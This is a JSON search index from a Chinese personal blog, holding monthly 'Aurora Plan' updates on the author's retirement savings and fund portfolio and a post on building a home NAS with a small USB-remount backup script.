[{"content":"前言 最近两个月A股反反复复，10月份跌破3000点后又回到了3000，最近又跌下去了，第二次跌破3000的我反而心态比一次更好了，所以说经历熊市才是最好的成长方式。\n但我仔细想过过这个事情，主要还是因为我投入的钱太少了，即使目前的钱全部亏完，最多心疼，但对于我目前来说造不成太大的心理伤害。\n最近在思考”长期持有“这句话，我个人最近一直再思考着这类的话，我个人觉得”长期持有“这句话没有问题，但很容易误导，让大家都觉得只要一直持有就会上涨，实际情况远比所谓的”长期持有“复杂，因为大家搞投资本质上不是只是看看上涨过过瘾，是来赚钱的，所以大部分例子中的回测都是拉到了很多年，实际上仔细一看，每年的波动非常大，如果不幸在高点，那么其他人5年可以浮盈达到15%，而你甚至还浮亏。\n之所以说这么多，其实最主要的问题还是想说”长期持有“是没有问题，但是一定是在基于”好价格+好资产+长期持有“，”有知有行“这样具备投顾服务特性的APP是完全没有问题的，只需要做好信任主理人，然后长期持有，因为投顾会在里面帮你去平衡整体的价格，比如有知有行的长钱钱包会在股市上行的时候卖掉部分权益类基金，转而去提升债权类基金。\n实证 从2023年7月份开始，我开始实施退休计划，我将该计划称为“极光计划”，争取在45岁存够300万，然后每年7%的作为生活费过上退休的生活。\n实证记录我在每个月1-10号进行更新，主要记录上个月的情况。\n计划进度 当前极光计划完成度 0.1955%（当前资产 ÷ 目标资产），浮亏 133.73 元。\n预算及储蓄 2023年整体预算情况为：\n11月的储蓄率为59.477%。支出方面本月对比上月有所提高，超出的部分主要和家人出行游玩。从10月份开始调整了餐饮后，整体觉得目前是比较合适的。\n投资组合 愿望清单 最近家里面很早之前购买的小米净化器3传感器出现了问题，经常在睡觉的时候，转速自动调整为最大，导致吵闹得很，所以又将小米全效净化器恢复回来了。\n","permalink":"/posts/aurora-project-4/","summary":"前言 最近两个月A股反反复复，10月份跌破3000点后又回到了3000，最近又跌下去了，第二次跌破3000的我反而心态比一次更好了，所以说经历熊市才是最好的成长方式。\n但我仔细想过过这个事情，主要还是因为我投入的钱太少了，即使目前的钱全部亏完，最多心疼，但对于我目前来说造不成太大的心理伤害。\n最近在思考”长期持有“这句话，我个人最近一直再思考着这类的话，我个人觉得”长期持有“这句话没有问题，但很容易误导，让大家都觉得只要一直持有就会上涨，实际情况远比所谓的”长期持有“复杂，因为大家搞投资本质上不是只是看看上涨过过瘾，是来赚钱的，所以大部分例子中的回测都是拉到了很多年，实际上仔细一看，每年的波动非常大，如果不幸在高点，那么其他人5年可以浮盈达到15%，而你甚至还浮亏。\n之所以说这么多，其实最主要的问题还是想说”长期持有“是没有问题，但是一定是在基于”好价格+好资产+长期持有“，”有知有行“这样具备投顾服务特性的APP是完全没有问题的，只需要做好信任主理人，然后长期持有，因为投顾会在里面帮你去平衡整体的价格，比如有知有行的长钱钱包会在股市上行的时候卖掉部分权益类基金，转而去提升债权类基金。\n实证 从2023年7月份开始，我开始实施退休计划，我将该计划称为“极光计划”，争取在45岁存够300万，然后每年7%的作为生活费过上退休的生活。\n实证记录我在每个月1-10号进行更新，主要记录上个月的情况。\n计划进度 当前极光计划完成度 0.1955%（当前资产 ÷ 目标资产），浮亏 133.73 元。\n预算及储蓄 2023年整体预算情况为：\n11月的储蓄率为59.477%。支出方面本月对比上月有所提高，超出的部分主要和家人出行游玩。从10月份开始调整了餐饮后，整体觉得目前是比较合适的。\n投资组合 愿望清单 最近家里面很早之前购买的小米净化器3传感器出现了问题，经常在睡觉的时候，转速自动调整为最大，导致吵闹得很，所以又将小米全效净化器恢复回来了。","title":"4-极光计划实证：经历了熊市才算成长"},{"content":"前言 最近一个月算是第一次关注投资以来经历的第一次“小起小落”，上证下到了3000点以下，自己的基金也最高亏到了190元，目前仍然浮亏。\n为什么是小起小落呢？自己总结了一下，可能是两个原因，其一是因为自己投入资金并不多，其二可能投入的钱并不会影响到生活，所以也就不在乎了，但我自己臆想，应该第一种可能性较大。\n在上个月月底自己从小结伴的表姐被我一顿洗脑买了一部分基金，但整体不多闹着玩的投入了400-500元，但到了跌到3000点附近的时候，表姐给我发了一条消息，附上了一张截图（图片大概是某个网络博主说A股没有希望了），意思是要先撤退不玩了，也就是默认赞同了A股没有希望这一说。\n但好在平时关注了几个风格比较喜欢的博主，常被这些博主有理有据的“按摩”，反而到期待这个市场是怎么走向。\n对于市场不好的时候，我个人思路是A股越跌，优质资产就越多，毕竟“好价格+好资产+长期持有=高回报”，如果真正出现了A股一直跌，那么反正大家持有都为人民币，一直跌下去，也就是说明中国经济不行了，那么人民币也就会随之贬值，当然这种说法有点PUA，也不全无道理。\n上面这种思路，我记得橡树资本的创始人霍华德·马克斯（名字还是现查才记住）在《周期》一书中还应用到了投资当中，并且也获得了非常好的回报。\n最近在看也大的公众号连载《减重日记》系列，看了几期后，颠覆了平常对于减肥认知，同时也将《中国居民膳食指南》这本书加入了待看清单中，准备后面有时间了多了解了解。\n实证 从2023年7月份开始，我开始实施退休计划，我将该计划称为“极光计划”，争取在45岁存够300万，然后每年7%的作为生活费过上退休的生活。\n实证记录我在每个月1-10号进行更新，主要记录上个月的情况。\n计划进度 当前极光计划完成度 0.1634%（当前资产 ÷ 目标资产），浮亏 96.49 元。\n预算及储蓄 2023年整体预算情况为：\n10月的储蓄率为39.85%，因给自己买入了重疾险，所以储蓄部分降低了。\n本月支出因为国庆节回老家，消费过高，导致分摊预算中一直存在一笔待摊销奋勇，正在逐月通过结余和购物预算进行分摊。\n本月日常餐饮结余的一部分正好填补了交通费超出的一部分，主要超出的部分在于外出打车，整体次数为5次。\n但通过此次实施的情况来看，交通费目前的预算是不太合理的，因为在日常生活中，即使自己有车的情况下，打车很难避免，所以准备在11月将其提高至900元。\n投资组合 投资组合本月没有变化。\n愿望清单 本月的愿望清单将Apple Watch S8购入了，这是因为最近看见也大发的公众号连载《减重日记》系列中提到对于长时间带Apple Watch可以通过健康应用找到“静息能量”和“活动能量”两个数据，这两个数据相加就可以代表当天消耗了多少卡路里，而这个值我觉得非常有用的地方在于，以前每天减肥不知道到底吃多少？只能按照能少吃则少吃的概念，但这个数据就提供了一个很好的参考。\n除此之外，加上Apple Watch 9出来了，Apple Watch8市场价格开始下降，正好看见我们一个做数码产品的朋友在出售一块二手的Apple Watch 8 45 GPS版本，价格1300，属于非常香的价格了。\n同时本月愿望清单中删除了小米智能电蒸锅，这个删除主要的原因在于产品的塑料问题，了解了一翻后发现这个产品的蒸盖是塑料的，所以暂时放弃了。\n关于净化器，目前和家人讨论了一番后，觉得似乎性价比不高，这是因为本质上散甲醛最好的方式还是通风，所以空气净化器的应用场景就只有在夏天、空调屋了，但四川这边马上进入冬天，实际上可以接受随时开着窗子，而冬天一过，我们整体的装修时间已经达到了小一年了，所以也就放弃了。\n","permalink":"/posts/aurora-project-3/","summary":"前言 最近一个月算是第一次关注投资以来经历的第一次“小起小落”，上证下到了3000点以下，自己的基金也最高亏到了190元，目前仍然浮亏。\n为什么是小起小落呢？自己总结了一下，可能是两个原因，其一是因为自己投入资金并不多，其二可能投入的钱并不会影响到生活，所以也就不在乎了，但我自己臆想，应该第一种可能性较大。\n在上个月月底自己从小结伴的表姐被我一顿洗脑买了一部分基金，但整体不多闹着玩的投入了400-500元，但到了跌到3000点附近的时候，表姐给我发了一条消息，附上了一张截图（图片大概是某个网络博主说A股没有希望了），意思是要先撤退不玩了，也就是默认赞同了A股没有希望这一说。\n但好在平时关注了几个风格比较喜欢的博主，常被这些博主有理有据的“按摩”，反而到期待这个市场是怎么走向。\n对于市场不好的时候，我个人思路是A股越跌，优质资产就越多，毕竟“好价格+好资产+长期持有=高回报”，如果真正出现了A股一直跌，那么反正大家持有都为人民币，一直跌下去，也就是说明中国经济不行了，那么人民币也就会随之贬值，当然这种说法有点PUA，也不全无道理。\n上面这种思路，我记得橡树资本的创始人霍华德·马克斯（名字还是现查才记住）在《周期》一书中还应用到了投资当中，并且也获得了非常好的回报。\n最近在看也大的公众号连载《减重日记》系列，看了几期后，颠覆了平常对于减肥认知，同时也将《中国居民膳食指南》这本书加入了待看清单中，准备后面有时间了多了解了解。\n实证 从2023年7月份开始，我开始实施退休计划，我将该计划称为“极光计划”，争取在45岁存够300万，然后每年7%的作为生活费过上退休的生活。\n实证记录我在每个月1-10号进行更新，主要记录上个月的情况。\n计划进度 当前极光计划完成度 0.1634%（当前资产 ÷ 目标资产），浮亏 96.49 元。\n预算及储蓄 2023年整体预算情况为：\n10月的储蓄率为39.85%，因给自己买入了重疾险，所以储蓄部分降低了。\n本月支出因为国庆节回老家，消费过高，导致分摊预算中一直存在一笔待摊销奋勇，正在逐月通过结余和购物预算进行分摊。\n本月日常餐饮结余的一部分正好填补了交通费超出的一部分，主要超出的部分在于外出打车，整体次数为5次。\n但通过此次实施的情况来看，交通费目前的预算是不太合理的，因为在日常生活中，即使自己有车的情况下，打车很难避免，所以准备在11月将其提高至900元。\n投资组合 投资组合本月没有变化。\n愿望清单 本月的愿望清单将Apple Watch S8购入了，这是因为最近看见也大发的公众号连载《减重日记》系列中提到对于长时间带Apple Watch可以通过健康应用找到“静息能量”和“活动能量”两个数据，这两个数据相加就可以代表当天消耗了多少卡路里，而这个值我觉得非常有用的地方在于，以前每天减肥不知道到底吃多少？只能按照能少吃则少吃的概念，但这个数据就提供了一个很好的参考。\n除此之外，加上Apple Watch 9出来了，Apple Watch8市场价格开始下降，正好看见我们一个做数码产品的朋友在出售一块二手的Apple Watch 8 45 GPS版本，价格1300，属于非常香的价格了。\n同时本月愿望清单中删除了小米智能电蒸锅，这个删除主要的原因在于产品的塑料问题，了解了一翻后发现这个产品的蒸盖是塑料的，所以暂时放弃了。\n关于净化器，目前和家人讨论了一番后，觉得似乎性价比不高，这是因为本质上散甲醛最好的方式还是通风，所以空气净化器的应用场景就只有在夏天、空调屋了，但四川这边马上进入冬天，实际上可以接受随时开着窗子，而冬天一过，我们整体的装修时间已经达到了小一年了，所以也就放弃了。","title":"#3-极光计划实证：小起小落"},{"content":"从两个月前，我着手搭建了一套家用Nas，起因之前自己的资料一直存放在ICloud，因为自己的资料比较多，在600多G，所以自己一直购买的国区2T，每个月68元，一年816元，也不算便宜了。再加上自己的资料和储存的数据越来越大，所以就有就有了这个需求。\n对于资料不多、储存量不大的用户，不建议使用Nas，使用自带的云储存足够了，自己组建Nas只有在一定储存量级，才会有价值，所以对于数据量少的朋友，看看就行了，别折腾了。\n同时自己电脑有两台，一台苹果笔记本，一台Windows笔记本，ICloud对于Windows系统同步是真的难用，甚至打开文件夹都会卡顿，所以也是其自己搭建Nas的一个小因素了。\n选购之前对比了多种方式，购买其他国内云储存服务、自己购买云主机自己搭建、购买成品NAS、自己搭组NAS。\n先说说前两者，国内云服务研究了一番后，排除了，具体原因暂时不好说。然后就是云主机搭建，后面研究一番发现不论国内还是国内的云主机，硬盘都贵得要死。\n再说说后两者，也是我纠结最久的，成品Nas的优点就是不用折腾、省心以及有技术服务支撑，缺点就是配置低、价格贵。自己组Nas的优点在于便宜、配置高，缺点就是折腾，也不省心。\n那作为以技术出身的人来说，自己组Nas的缺点到成了一个有趣的过程，而配置高也满足了技术人员常常的幻想”配置不够“这一假说。\n所以最终思考了一下，准备折腾一下自己，组建Nas就成了最优选择。\n选购 既然是自己组建，就得自己挑选硬件、考虑配置、选择系统，系统我选择的是群晖，也就是所谓的黑群晖，主要考虑到配套的软件足够好用，关于硬件选配，可以参考隔壁网这篇文章《2022年组建群晖实体机的一些建议 - 黑白群晖 - 隔壁网 (gebi1.com)》。\n我的配置目前是：\nCPU：考虑到需要看电影做解码，所以选择了i3-8100T，然后带T属于低功耗，对于Nas来说也完全够用了。 内存：32G。 硬盘：8TB硬盘两块，用于存放资料、文件。16TB硬盘一块，用于存放电影。 主板：选择了大厂微星的Z370M Mortar。 机箱：Treasure宝藏盒，快700多的一个机箱了，已经算比较贵了，但是买回来看了一下外观，真香。 风扇：利民AXP90 电源：Flex台达250W电源 这里需要说一个事情，我没有配备缓存，群晖的系统可以配备2块M2 Nvme硬盘作为缓存组，可以用于读写缓存，单盘只能作为读缓存。我研究了一番后，决定还是不用缓存，第一个对于我这样的家用环境上缓存提升不大，也有很多家用小伙伴测试后发了相关的结论。第二个就是缓存可能导致故障，第三个性价比不高。\n系统 系统采用的是群晖，既然是自己搭建的，所以也就是所谓的黑群晖了，采用的引导是最简单的引导arpl-i18n，该引导是基于巴西大佬arpl的版本上改进的，对于两者我还真不知道差距在哪里，但只要好用，然后用的人多就行了。\n然后黑群晖的引导是需要一个U盘的，正常情况下U盘可以插在机箱前面或者后面，但是对于花了700多买了这么漂亮的机箱，U盘插在前后，犹如”一坨牛屎抹在鲜花上“。\n所以我就购买了一个主板的usb插座，然后将引导U盘插在上面，这样就可以把usb隐藏在机箱内了。\n备份 我的备份组合主要集中为四种，分别RAID1+Cloud Sync+Hyper Backup网盘+Hyper Backup硬盘，其中RAID1虽然说起来不算是”备份“方案，但本质提供冗余还是一种数据的保障，所以也就算了进来。\nHyper Backup则是提供了一个完整的套件、文件增量备份，每天执行一次。\nCloud Sync则是作为一个补充，提供一个实时的文件同步，将文件同步到我的Onedrive，至于为什么是Onedrive，第一个原因是支持，第二个原因是因为我每年要买Office365，所以有1TB的免费网盘容量。\nHyper Backup是目前我觉得最好的备份方案，Hyper Backup支持备份到云服务商、本地USB储存设备等方式。Hyper Backup我采用了两种方式，分别为阿里云盘通过Alist以WebDAV的方式挂载到本地，然后Hyper Backup选择WebDAV方式进行备份，好处在于阿里云盘服务器在国内比较稳定，关于如何通过查看Alist关于阿里云盘的文档。\n第二种方式，我采用的是本地USB插入硬盘的方式，这个方式有个好处在于能无限扩大备份目的地的容量，比如你可以通过一个硬盘盒做多个盘用USB接入，同时配置好了也比较省电省电。\n为什么说省电呢？在设置为USB为备份目的地的时候，配置可以选择，当备份完成后自动断开卸载USB，然后再加上硬盘盒的自动休眠，就可以在备份完成后的耗电降到最低，比如下图（因为我目前已经设置完成，所以找不到这个选项了，就借用了一张图片）。\n但这种方式有一个问题，就是你在下次备份的时候没有办法自动挂载，你需要通过定时任务，将在定时的自动备份任务开始之前将USB重新挂载好。\n重新挂载USB需要两个步骤，第一个步骤确定USB编号，需要打开群晖的SSH，然后进入到终端后使用lsusb命令，我找到我备份目的地的硬盘为2-3：\n第二个步骤是将如下代码放入群晖的任务计划，选择运行的用户为root（一定注意，卸载挂载外置设备需要root权限）：\n然后将如下代码放入脚本中，其中的2-3需要替换为备份的外置目的地设备编号。\necho 0 \u0026gt; /sys/bus/usb/devices/2-3/authorized echo 1 \u0026gt; /sys/bus/usb/devices/2-3/authorized 最后，设定好计划时间，我目前是在Hyper Backup之前的5分钟挂载。\n结尾 说完了后，说说成品Nas和自己搭建Nas推荐哪个，整体就是完全不建议没有技术或者不想折腾的人来自己搭建Nas，更建议直接买群晖或者其他厂商的成品Nas，对于有技术的用户，这种方式就挺推荐的。\n搭建到如今，也算是对稳定性比较信任了，将自己照片、文件都转移到了群晖，同时也说服了自己的爱人将手机照片转到了群晖，不得不说群晖的配套软件是真的好用，买软件送硬件也不是无道理，看来以后买一个白裙也不是不可以。\n参考文章 # Synology NAS 的 USB 外接硬碟在系統中的順序 / HyperBackup 備份後自動卸載該如何重新掛載 2022年组建群晖实体机的一些建议 - 黑白群晖 - 隔壁网 (gebi1.com) ","permalink":"/posts/home-nas-2023/","summary":"从两个月前，我着手搭建了一套家用Nas，起因之前自己的资料一直存放在ICloud，因为自己的资料比较多，在600多G，所以自己一直购买的国区2T，每个月68元，一年816元，也不算便宜了。再加上自己的资料和储存的数据越来越大，所以就有就有了这个需求。\n对于资料不多、储存量不大的用户，不建议使用Nas，使用自带的云储存足够了，自己组建Nas只有在一定储存量级，才会有价值，所以对于数据量少的朋友，看看就行了，别折腾了。\n同时自己电脑有两台，一台苹果笔记本，一台Windows笔记本，ICloud对于Windows系统同步是真的难用，甚至打开文件夹都会卡顿，所以也是其自己搭建Nas的一个小因素了。\n选购之前对比了多种方式，购买其他国内云储存服务、自己购买云主机自己搭建、购买成品NAS、自己搭组NAS。\n先说说前两者，国内云服务研究了一番后，排除了，具体原因暂时不好说。然后就是云主机搭建，后面研究一番发现不论国内还是国内的云主机，硬盘都贵得要死。\n再说说后两者，也是我纠结最久的，成品Nas的优点就是不用折腾、省心以及有技术服务支撑，缺点就是配置低、价格贵。自己组Nas的优点在于便宜、配置高，缺点就是折腾，也不省心。\n那作为以技术出身的人来说，自己组Nas的缺点到成了一个有趣的过程，而配置高也满足了技术人员常常的幻想”配置不够“这一假说。\n所以最终思考了一下，准备折腾一下自己，组建Nas就成了最优选择。\n选购 既然是自己组建，就得自己挑选硬件、考虑配置、选择系统，系统我选择的是群晖，也就是所谓的黑群晖，主要考虑到配套的软件足够好用，关于硬件选配，可以参考隔壁网这篇文章《2022年组建群晖实体机的一些建议 - 黑白群晖 - 隔壁网 (gebi1.com)》。\n我的配置目前是：\nCPU：考虑到需要看电影做解码，所以选择了i3-8100T，然后带T属于低功耗，对于Nas来说也完全够用了。 内存：32G。 硬盘：8TB硬盘两块，用于存放资料、文件。16TB硬盘一块，用于存放电影。 主板：选择了大厂微星的Z370M Mortar。 机箱：Treasure宝藏盒，快700多的一个机箱了，已经算比较贵了，但是买回来看了一下外观，真香。 风扇：利民AXP90 电源：Flex台达250W电源 这里需要说一个事情，我没有配备缓存，群晖的系统可以配备2块M2 Nvme硬盘作为缓存组，可以用于读写缓存，单盘只能作为读缓存。我研究了一番后，决定还是不用缓存，第一个对于我这样的家用环境上缓存提升不大，也有很多家用小伙伴测试后发了相关的结论。第二个就是缓存可能导致故障，第三个性价比不高。\n系统 系统采用的是群晖，既然是自己搭建的，所以也就是所谓的黑群晖了，采用的引导是最简单的引导arpl-i18n，该引导是基于巴西大佬arpl的版本上改进的，对于两者我还真不知道差距在哪里，但只要好用，然后用的人多就行了。\n然后黑群晖的引导是需要一个U盘的，正常情况下U盘可以插在机箱前面或者后面，但是对于花了700多买了这么漂亮的机箱，U盘插在前后，犹如”一坨牛屎抹在鲜花上“。\n所以我就购买了一个主板的usb插座，然后将引导U盘插在上面，这样就可以把usb隐藏在机箱内了。\n备份 我的备份组合主要集中为四种，分别RAID1+Cloud Sync+Hyper Backup网盘+Hyper Backup硬盘，其中RAID1虽然说起来不算是”备份“方案，但本质提供冗余还是一种数据的保障，所以也就算了进来。\nHyper Backup则是提供了一个完整的套件、文件增量备份，每天执行一次。\nCloud Sync则是作为一个补充，提供一个实时的文件同步，将文件同步到我的Onedrive，至于为什么是Onedrive，第一个原因是支持，第二个原因是因为我每年要买Office365，所以有1TB的免费网盘容量。\nHyper Backup是目前我觉得最好的备份方案，Hyper Backup支持备份到云服务商、本地USB储存设备等方式。Hyper Backup我采用了两种方式，分别为阿里云盘通过Alist以WebDAV的方式挂载到本地，然后Hyper Backup选择WebDAV方式进行备份，好处在于阿里云盘服务器在国内比较稳定，关于如何通过查看Alist关于阿里云盘的文档。\n第二种方式，我采用的是本地USB插入硬盘的方式，这个方式有个好处在于能无限扩大备份目的地的容量，比如你可以通过一个硬盘盒做多个盘用USB接入，同时配置好了也比较省电省电。\n为什么说省电呢？在设置为USB为备份目的地的时候，配置可以选择，当备份完成后自动断开卸载USB，然后再加上硬盘盒的自动休眠，就可以在备份完成后的耗电降到最低，比如下图（因为我目前已经设置完成，所以找不到这个选项了，就借用了一张图片）。\n但这种方式有一个问题，就是你在下次备份的时候没有办法自动挂载，你需要通过定时任务，将在定时的自动备份任务开始之前将USB重新挂载好。\n重新挂载USB需要两个步骤，第一个步骤确定USB编号，需要打开群晖的SSH，然后进入到终端后使用lsusb命令，我找到我备份目的地的硬盘为2-3：\n第二个步骤是将如下代码放入群晖的任务计划，选择运行的用户为root（一定注意，卸载挂载外置设备需要root权限）：\n然后将如下代码放入脚本中，其中的2-3需要替换为备份的外置目的地设备编号。\necho 0 \u0026gt; /sys/bus/usb/devices/2-3/authorized echo 1 \u0026gt; /sys/bus/usb/devices/2-3/authorized 最后，设定好计划时间，我目前是在Hyper Backup之前的5分钟挂载。\n结尾 说完了后，说说成品Nas和自己搭建Nas推荐哪个，整体就是完全不建议没有技术或者不想折腾的人来自己搭建Nas，更建议直接买群晖或者其他厂商的成品Nas，对于有技术的用户，这种方式就挺推荐的。\n搭建到如今，也算是对稳定性比较信任了，将自己照片、文件都转移到了群晖，同时也说服了自己的爱人将手机照片转到了群晖，不得不说群晖的配套软件是真的好用，买软件送硬件也不是无道理，看来以后买一个白裙也不是不可以。\n参考文章 # Synology NAS 的 USB 外接硬碟在系統中的順序 / HyperBackup 備份後自動卸載該如何重新掛載 2022年组建群晖实体机的一些建议 - 黑白群晖 - 隔壁网 (gebi1.","title":"最近搭建了一台家用Nas"},{"content":"前言 最近想了一个方式，找了一些基金的历史数据，并且做了一些回测，下面是我做了回测后在也大的知识星球上提出的提问以及也大回复的内容。\n也大，最近一直在思考实现你提到的Mini财务自由，我采集了2019年5月1日至2023年9月15日的数据，制作了两组永久组合的数据，分别为：\n黄金基金：易方达黄金ETF(159934)。偏股基金：兴全合润混合LOF（163406）。货币基金：易方达中债1-3年国开债A(007169)。债券基金：易方达中债7-10年国开债A(003358)。 黄金基金：易方达黄金ETF(159934)。偏股基金：兴全合润混合LOF（163406）。货币基金：长城收益宝货币A(004972)。债券基金：招商产业债券A(217022) 上面两种主要验证也大之前提到的永久组合里面原书建议货币为短期国债、债券则为长期国债，这里用国开行的准国债作为国债，然后再根据也打原文章中提到的国内配置普通债券和货币基金即可，所以这里做了两组。\n参数情况为：\n当每个月的第一个交易日，自动追加1万资金，4个基金各25%。 每年2月10日，自动提取资金的7%和10%两种情况（7%和10%的区别，考虑了3%的通货膨胀） 初始资金1万元，4个基金各25%。 第一种组合，在每年提取10%的生活费的情况下，结果为总投入资金为530,000，总提取生活费为107634，总收益为6.37%，提取后的收益为-13.93%。\n第一种组合，在每年提取7%的生活费的情况下，结果为总投入资金为530,000，总提取生活费为77635，总收益为6.43%，提取后的收益为8.2%。\n第二种组合，在每年提取10%的生活费的情况下，结果为总投入资金为530,000，总提取生活费为109550，总收益为8.02%，提取后的收益为-12.64%。 ![[fcba6de9b99ab585ad3816aa88c6bd49_MD5.png]]\n第二种组合，在每年提取7%的生活费的情况下，结果为总投入资金为530,000，总提取生活费为79044，总收益为8.17%，提取后的收益为-6.73%\n经过上面的数据验证，我有几个疑问需要想向也大请教：\n经过上面的数据测试，我理解的后一种方式应该属于可行，因为在经济很差的环境下只计算出亏损6.7%，不知道这样解读是不是有错误的认知？ 我理解的债券，大部分是属于企业债，在正常的环境下，债券涨股票跌，反之一样，我理解的属于正常的资金左右流动。但对于市场差的情况下，比如这几年大经济环境不好，两者都在跌，这样风险还是很高，这对于永久组合来说是不是有点反其道而行？ 对于上述数据，也大还有其他的见解吗？ 也大的回复为：\n为什么要选择永久组合作为被动收入的回测策略呢？ 如果想要 mini 版财务自由，思考的前提条件应该是【预期收益大于提款比率】，但永久组合本身的预期收益率不太可能达到 7%～10% 这样的收益。所以用永久组合来做这个回测感觉意义不是特别大，得出的结论也因此不太有参考性。 另外做回测还需要有意识地确定回测的起止时间，这一点对于永久组合的影响倒是不太大，因为组合本身比较平稳。但对于其他权益类投资占比更高，波动更大的投资，需要更仔细地选择回测的起止时间，起止点最好能涵盖一整轮牛熊。 我自己也做过一些回测，发现除了资产配置的比例，留有一定比例的备用金，在市场低估时期避免直接提取投资、伤害本金，也有利于改善长期收益：自由之路提前 2 年 思路供你参考 不过对于这样提出想法、数据验证的回测思路还是很点赞的，喜欢这样有理有据的思考 👍 可以问问是有什么回测工具吗？还是自己写的代卖？最后的数据图很漂亮～\n实证 从2023年7月份开始，我开始实施退休计划，我将该计划称为“极光计划”，争取在45岁存够300万，然后每年7%的作为生活费过上退休的生活。\n实证记录我在每个月1-10号进行更新，主要记录上个月的情况。\n这是第二期次记录，这个月整体对自己的基金进行了部分调整，并增加了部分QDII投资美股标普500和纳斯达克100以及投资全球债券的基金。\n计划进度 当前极光计划完成度 0.1322%（当前资产 ÷ 目标资产），累计亏损 0.8252%，浮亏 33.01 元。\n预算及储蓄 9月的储蓄率为60.5%，整体结余情况为0。\n这个月国庆节回到了老家，导致预算严重超支，达到了3484元，估计往后的大半年时间得慢慢分摊了，也算是开局来了一个当头一棒。\n除此之外，从9月开始，增加了应急资金账户，应急资金账户是预计存够1年的生活费（后期可能增加），所以将储蓄和投资的一部分钱分摊到该账户当中了。\n9月份预算实施情况如下：\n投资组合 投资组合这个月做了更新，增加了可以投资海外市场的QDII基金，我目前采用80%国内市场+20%海外市场，国内则进一步分为50%的偏股+30%债券，海外则是70%的偏股+30%债券。\n投资海外市场本质也是一种风险分摊，但目前海外市场美股中，大部分我个人觉得在比较高的位置，可能后期虽然按照相关比例投资，但可能会考虑将一部分投入海外的基金放入到货币中备用。\n愿望清单 愿望清单中的Apple Watch已进入删除队列，已无购买欲望，同时增加了Apple Pencli和空气净化器，电子笔的作用主要最近发现书比较麻烦，用IPad反而方便携带和看书，所以有了这个想法。\n净化器则是准备12月月初准备搬进新房子，有点担心安全问题，所以净化器加入待选名单，其中两个净化器都是小米出的具备甲醛催化技术的净化器。\n这个东西我查阅了资料，发现和之前的除甲醛方案不一样，之前的除甲醛方案是通过滤芯（带活性炭）进行吸附，而长时间下来，滤芯里面堆积了甲醛不说，还会随着使用，效果也慢慢降低。而小米的这个催化技术则是将其分解成二氧化碳和水，并且官方声称的不用更换催化滤芯，有兴趣的朋友可以看看拆废 7 个净化器滤芯，除甲醛怎么选空气净化器？_哔哩哔哩_bilibili。\n同时之前的大部分净化器滤芯是采用的复合滤芯，也就是活性炭涂层都在一起，那这就有个问题，装修过房子的朋友都知道，活性炭的炭包在使用一段时间后，可以通过在阳光下的爆晒，将其内部吸附的物质释放出去，从而可以达到重复利用，但是对于复合滤芯无法达到了，要不然一起换要不然就不换。\n而小米全效净化器以及Ultra款，活性炭是单独分开的，这也就是说可以无形中省下一部分钱。\n彩蛋 关于前言做的回测，发现实际上算的结果有问题，所以在后面进行更正，也欢迎讨论，拜了个拜。\n","permalink":"/posts/aurora-project-2/","summary":"前言 最近想了一个方式，找了一些基金的历史数据，并且做了一些回测，下面是我做了回测后在也大的知识星球上提出的提问以及也大回复的内容。\n也大，最近一直在思考实现你提到的Mini财务自由，我采集了2019年5月1日至2023年9月15日的数据，制作了两组永久组合的数据，分别为：\n黄金基金：易方达黄金ETF(159934)。偏股基金：兴全合润混合LOF（163406）。货币基金：易方达中债1-3年国开债A(007169)。债券基金：易方达中债7-10年国开债A(003358)。 黄金基金：易方达黄金ETF(159934)。偏股基金：兴全合润混合LOF（163406）。货币基金：长城收益宝货币A(004972)。债券基金：招商产业债券A(217022) 上面两种主要验证也大之前提到的永久组合里面原书建议货币为短期国债、债券则为长期国债，这里用国开行的准国债作为国债，然后再根据也打原文章中提到的国内配置普通债券和货币基金即可，所以这里做了两组。\n参数情况为：\n当每个月的第一个交易日，自动追加1万资金，4个基金各25%。 每年2月10日，自动提取资金的7%和10%两种情况（7%和10%的区别，考虑了3%的通货膨胀） 初始资金1万元，4个基金各25%。 第一种组合，在每年提取10%的生活费的情况下，结果为总投入资金为530,000，总提取生活费为107634，总收益为6.37%，提取后的收益为-13.93%。\n第一种组合，在每年提取7%的生活费的情况下，结果为总投入资金为530,000，总提取生活费为77635，总收益为6.43%，提取后的收益为8.2%。\n第二种组合，在每年提取10%的生活费的情况下，结果为总投入资金为530,000，总提取生活费为109550，总收益为8.02%，提取后的收益为-12.64%。 ![[fcba6de9b99ab585ad3816aa88c6bd49_MD5.png]]\n第二种组合，在每年提取7%的生活费的情况下，结果为总投入资金为530,000，总提取生活费为79044，总收益为8.17%，提取后的收益为-6.73%\n经过上面的数据验证，我有几个疑问需要想向也大请教：\n经过上面的数据测试，我理解的后一种方式应该属于可行，因为在经济很差的环境下只计算出亏损6.7%，不知道这样解读是不是有错误的认知？ 我理解的债券，大部分是属于企业债，在正常的环境下，债券涨股票跌，反之一样，我理解的属于正常的资金左右流动。但对于市场差的情况下，比如这几年大经济环境不好，两者都在跌，这样风险还是很高，这对于永久组合来说是不是有点反其道而行？ 对于上述数据，也大还有其他的见解吗？ 也大的回复为：\n为什么要选择永久组合作为被动收入的回测策略呢？ 如果想要 mini 版财务自由，思考的前提条件应该是【预期收益大于提款比率】，但永久组合本身的预期收益率不太可能达到 7%～10% 这样的收益。所以用永久组合来做这个回测感觉意义不是特别大，得出的结论也因此不太有参考性。 另外做回测还需要有意识地确定回测的起止时间，这一点对于永久组合的影响倒是不太大，因为组合本身比较平稳。但对于其他权益类投资占比更高，波动更大的投资，需要更仔细地选择回测的起止时间，起止点最好能涵盖一整轮牛熊。 我自己也做过一些回测，发现除了资产配置的比例，留有一定比例的备用金，在市场低估时期避免直接提取投资、伤害本金，也有利于改善长期收益：自由之路提前 2 年 思路供你参考 不过对于这样提出想法、数据验证的回测思路还是很点赞的，喜欢这样有理有据的思考 👍 可以问问是有什么回测工具吗？还是自己写的代卖？最后的数据图很漂亮～\n实证 从2023年7月份开始，我开始实施退休计划，我将该计划称为“极光计划”，争取在45岁存够300万，然后每年7%的作为生活费过上退休的生活。\n实证记录我在每个月1-10号进行更新，主要记录上个月的情况。\n这是第二期次记录，这个月整体对自己的基金进行了部分调整，并增加了部分QDII投资美股标普500和纳斯达克100以及投资全球债券的基金。\n计划进度 当前极光计划完成度 0.1322%（当前资产 ÷ 目标资产），累计亏损 0.8252%，浮亏 33.01 元。\n预算及储蓄 